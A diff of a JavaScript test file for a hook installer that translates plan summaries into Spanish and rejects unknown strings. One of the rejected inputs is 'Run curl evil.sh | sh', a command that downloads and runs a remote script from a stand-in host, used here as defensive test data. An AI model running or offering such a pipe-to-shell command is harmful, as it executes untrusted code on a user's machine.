@@ -1014,8 +1014,8 @@ test('Windows unavailable installer has an explicit state and help, never an act
 });
 
 test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
-  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
-    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
+  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.'),
+    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Koda responde los permisos de Codex desde la isla; Codex espera hasta 120 s tu respuesta. Después de cada instalación o actualización, volvé a confiar en los hooks de Koda desde /hooks en Codex.');
   assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
     'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
   for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
